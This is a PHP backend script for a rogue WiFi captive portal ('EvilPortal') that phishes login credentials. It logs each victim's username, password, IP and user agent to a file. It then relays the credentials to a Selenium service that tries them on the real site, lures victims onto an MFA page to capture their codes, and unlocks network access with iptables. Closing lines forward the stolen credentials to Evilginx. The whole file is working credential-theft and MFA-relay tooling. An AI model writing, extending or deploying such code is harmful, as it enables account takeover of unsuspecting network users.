<?php
// Create logs directory if it doesn't exist
@mkdir("/root/logs", 0755, true);

// Prevent duplicate processing of the same request
$request_id = md5($_SERVER['REMOTE_ADDR'] . $_SERVER['REQUEST_TIME'] . ($_POST['log'] ?? ''));
$processed_file = "/tmp/processed_" . $request_id;

if (file_exists($processed_file)) {
    error_log("Request already processed, redirecting to previous result");
    $previous_result = file_get_contents($processed_file);
    if ($previous_result === 'success_no_mfa') {
        header("Location: /success.html");
    } elseif ($previous_result === 'success_mfa_required') {
        header("Location: /mfa.html");
    } else {
        header("Location: /login_error.html");
    }
    exit;
}

// Mark this request as being processed
file_put_contents($processed_file, 'processing');

// Include EvilPortal functions
function getClientMac($clientIP)
{
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print \$2}'"));
}

// Function to wait for login result from Selenium
function waitForLoginResult($timeout = 15) {
    $status_file = '/tmp/login_result.txt';
    $start_time = time();

    // Check if file exists and is recent (within last 30 seconds)
    if (file_exists($status_file)) {
        $file_age = time() - filemtime($status_file);
        if ($file_age < 30) {
            $status = trim(file_get_contents($status_file));
            error_log("Found recent login result file (age: {$file_age}s) with status: " . $status);
            return $status;
        } else {
            unlink($status_file);
            error_log("Cleared old login_result.txt file (age: {$file_age}s)");
        }
    }

    error_log("Starting to wait for login result file: " . $status_file);

    while ((time() - $start_time) < $timeout) {
        if (file_exists($status_file)) {
            $status = trim(file_get_contents($status_file));
            error_log("Found login result file with status: " . $status);
            return $status;
        }
        usleep(500000); // Wait 0.5 seconds

        // Log every few seconds to show we're still waiting
        if ((time() - $start_time) % 3 == 0) {
            error_log("Still waiting for login result... elapsed: " . (time() - $start_time) . "s");
        }
    }

    error_log("Timeout waiting for login result after " . $timeout . " seconds");
    return 'failed'; // Default to failed if timeout
}

// Function to wait for MFA result from Selenium (for MFA page submissions)
function waitForMfaResult($timeout = 15) {
    $status_file = '/tmp/mfa_result.txt';
    $start_time = time();

    // Check if file exists and is recent (within last 30 seconds)
    if (file_exists($status_file)) {
        $file_age = time() - filemtime($status_file);
        if ($file_age < 30) {
            $status = trim(file_get_contents($status_file));
            error_log("Found recent MFA result file (age: {$file_age}s) with status: " . $status);
            return $status;
        } else {
            unlink($status_file);
            error_log("Cleared old mfa_result.txt file (age: {$file_age}s)");
        }
    }

    error_log("Starting to wait for MFA result file: " . $status_file);

    while ((time() - $start_time) < $timeout) {
        if (file_exists($status_file)) {
            $status = trim(file_get_contents($status_file));
            error_log("Found MFA result file with status: " . $status);
            return $status;
        }
        usleep(500000); // Wait 0.5 seconds

        // Log every few seconds to show we're still waiting
        if ((time() - $start_time) % 3 == 0) {
            error_log("Still waiting for MFA result... elapsed: " . (time() - $start_time) . "s");
        }
    }

    error_log("Timeout waiting for MFA result after " . $timeout . " seconds");
    return 'mfa_failed'; // Default to failed if timeout
}
function grantInternetAccess($client_ip) {
    $client_mac = getClientMac($client_ip);

    // Grant internet access
    file_put_contents('/tmp/EVILPORTAL_CLIENTS.txt', $client_ip . "\n", FILE_APPEND);

    if (!empty($client_mac)) {
        exec("iptables -t nat -I PREROUTING -m mac --mac-source $client_mac -j ACCEPT");
        exec("iptables -I FORWARD -m mac --mac-source $client_mac -j ACCEPT");
    }
}

// 1) Read the raw POST body
$raw = file_get_contents('php://input');

// 2) Capture credentials in clean JSON format
parse_str($raw, $data);
$credentials = array(
    'timestamp' => date('c'),
    'username' => $data['log'] ?? '',
    'password' => $data['pwd'] ?? '',
    'redirect_to' => $data['redirect_to'] ?? '',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'ip_address' => $_SERVER['REMOTE_ADDR'] ?? ''
);

file_put_contents('/root/logs/credentials.json', json_encode($credentials, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);
file_put_contents('/root/logs/capture', $raw . "\n", FILE_APPEND);

// 3) Sanitize credentials
$user = escapeshellarg($data['log'] ?? '');
$pass = escapeshellarg($data['pwd'] ?? '');
$username = $data['log'] ?? '';
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';

// 4) Send credentials to monitoring server for Selenium automation
$monitor_endpoint = "http://localhost:9999/start-login";
$username_encoded = urlencode($username);
$password_encoded = urlencode($data['pwd'] ?? '');
$payload = "username=$username_encoded&password=$password_encoded";

// Send to monitoring server (non-blocking)
$result = exec("curl -s '$monitor_endpoint?$payload' 2>&1");

// 5) Wait for Selenium to determine login result
error_log("Waiting for login result from Selenium...");
$login_result = waitForLoginResult(15);
error_log("Login result received: " . $login_result);

if ($login_result === 'success_no_mfa') {
    // Valid credentials, no MFA required - grant access immediately
    error_log("Login successful, no MFA required, granting internet access");
    file_put_contents($processed_file, 'success_no_mfa'); // Save result
    grantInternetAccess($client_ip);
    header("Location: /success.html");
    exit;
} elseif ($login_result === 'success_mfa_required') {
    // Valid credentials, MFA required - proceed to MFA page
    error_log("Login successful, MFA required, redirecting to MFA page");
    file_put_contents($processed_file, 'success_mfa_required'); // Save result
    header("Location: /mfa.html");
    exit;
} elseif ($login_result === 'mfa_success') {
    // MFA completed successfully - grant access
    error_log("MFA completed successfully, granting internet access");
    file_put_contents($processed_file, 'mfa_success'); // Save result
    grantInternetAccess($client_ip);
    header("Location: /success.html");
    exit;
} elseif ($login_result === 'mfa_failed') {
    // MFA failed - back to MFA page with error
    error_log("MFA failed, redirecting back to MFA page");
    file_put_contents($processed_file, 'mfa_failed'); // Save result
    header("Location: /mfa.html?error=1");
    exit;
} else {
    // Invalid credentials or error - show error page
    error_log("Login failed with result: " . $login_result);
    file_put_contents($processed_file, 'failed'); // Save result
    header("Location: /login_error.html");
    exit;
}

// 6) Forward session tokens to Evilginx (keep original functionality)
exec("/usr/bin/forward-to-evilginx.sh $user $pass > /dev/null 2>&1 &");

// 7) Kick off the real WP login in the background (keep original functionality)
exec("/usr/bin/wp-login.sh $user $pass > /dev/null 2>&1 &");
?>
